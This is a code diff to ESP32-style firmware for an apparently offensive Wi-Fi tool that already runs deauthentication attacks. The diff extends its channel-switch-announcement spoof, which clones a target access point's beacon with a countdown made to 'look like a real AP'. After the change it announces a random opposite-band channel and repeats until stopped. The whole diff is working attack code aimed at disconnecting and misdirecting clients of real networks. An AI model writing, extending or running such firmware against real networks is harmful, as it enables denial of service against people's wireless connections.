@@ -99,7 +99,7 @@ void print_help() {
   Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
   Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
   Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
-  Serial.println("INFO CSA <idx> <ch> [cnt] [secs]   CSA spoof: count down on the AP channel, then clone on <ch>");
+  Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
   Serial.println("INFO CSASTOP                       stop the CSA spoof");
   Serial.println("INFO CSATEST                       dump the CSA action/beacon bytes (format check)");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
@@ -296,6 +296,10 @@ void do_status() {
   Serial.print((unsigned)csa_clients());
   Serial.print(" csch=");
   Serial.print((unsigned)csa_new_channel());
+  Serial.print(" csaauto=");
+  Serial.print(csa_auto_channel() ? 1 : 0);
+  Serial.print(" csacycle=");
+  Serial.print((unsigned)csa_cycles());
   Serial.print(" reason=");
   if (attack_reason_is_random()) {
     Serial.print("random");
@@ -357,24 +361,28 @@ void do_deauth(int index, uint16_t reason) {
   ui_log("deauth started");
 }
 
-// CSA <idx> <new-channel> [count] [hold-seconds]
-// index comes from the last SCAN; count must look like a real AP countdown (2..8);
-// hold-seconds is how long the cloned beacon stays alive on the new channel.
+// CSA <idx> [new-channel|auto] [count] [hold-seconds]
+// Without a channel (or with "auto") the firmware announces a channel from the
+// opposite band -- 2.4 GHz AP -> random 5 GHz channel, 5 GHz AP -> random 2.4 GHz
+// -- and repeats the announce+hold cycle until CSASTOP. A channel given
+// explicitly keeps the old one-shot behaviour.
 void do_csa(int index, long channel, long count, long hold_seconds) {
   if (index < 0 || index >= g_scan_count) {
     Serial.println("ERR index out of range, run SCAN first");
     return;
   }
-  const bool is_2g = channel >= 1 && channel <= 14;
-  const bool is_5g = channel >= 36 && channel <= 196;
-  if (!is_2g && !is_5g) {
-    Serial.println("ERR new channel must be 1..14 or 36..196");
-    return;
-  }
-  const int ap_channel = WiFi.channel(index);
-  if ((long)ap_channel == channel) {
-    Serial.println("ERR new channel must differ from the AP channel");
-    return;
+  const bool auto_channel = (channel < 0);
+  if (!auto_channel) {
+    const bool is_2g = channel >= 1 && channel <= 14;
+    const bool is_5g = channel >= 36 && channel <= 196;
+    if (!is_2g && !is_5g) {
+      Serial.println("ERR new channel must be 1..14 or 36..196");
+      return;
+    }
+    if ((long)WiFi.channel(index) == channel) {
+      Serial.println("ERR new channel must differ from the AP channel");
+      return;
+    }
   }
   if (count < 2 || count > 8) {
     Serial.println("ERR count must be 2..8 (a real AP counts down)");
@@ -384,11 +392,14 @@ void do_csa(int index, long channel, long count, long hold_seconds) {
     Serial.println("ERR hold seconds must be 1..600");
     return;
   }
-  if (!csa_start(index, (uint8_t)channel, (uint8_t)count, (uint16_t)hold_seconds)) {
+  const bool loop = auto_channel;
+  if (!csa_start(index, auto_channel ? 0 : (uint8_t)channel, (uint8_t)count,
+                 (uint16_t)hold_seconds, loop)) {
     Serial.println("ERR cannot start CSA on that network");
     return;
   }
-  Serial.printf("OK CSA %d ch%ld count=%ld hold=%lds ssid=%s\n", index, channel, count, hold_seconds,
+  Serial.printf("OK CSA %d %s count=%ld hold=%lds loop=%d ssid=%s\n", index,
+                auto_channel ? "auto(opposite-band)" : "fixed", count, hold_seconds, loop ? 1 : 0,
                 WiFi.SSID(index).c_str());
   ui_log("csa started");
 }
@@ -779,12 +790,14 @@ void dispatch(char* line) {
     char* ch_token = strtok(nullptr, " \t");
     char* count_token = strtok(nullptr, " \t");
     char* hold_token = strtok(nullptr, " \t");
-    if (ch_token == nullptr) {
-      Serial.println("ERR usage: CSA <idx> <new-channel> [count 2-8] [hold-seconds]");
+    const int csa_idx = parse_index(idx_token);
+    if (csa_idx < 0) {
+      Serial.println("ERR usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]");
     } else {
-      do_csa(parse_index(idx_token), strtol(ch_token, nullptr, 10),
-             count_token ? strtol(count_token, nullptr, 10) : 5,
-             hold_token ? strtol(hold_token, nullptr, 10) : 15);
+      const bool auto_ch = (ch_token == nullptr) || (strcmp(ch_token, "auto") == 0);
+      do_csa(csa_idx, auto_ch ? -1 : strtol(ch_token, nullptr, 10),
+             auto_ch ? 5 : (count_token ? strtol(count_token, nullptr, 10) : 5),
+             auto_ch ? 5 : (hold_token ? strtol(hold_token, nullptr, 10) : 15));
     }
   } else if (strcmp(command, "CSASTOP") == 0) {
     do_csa_stop();
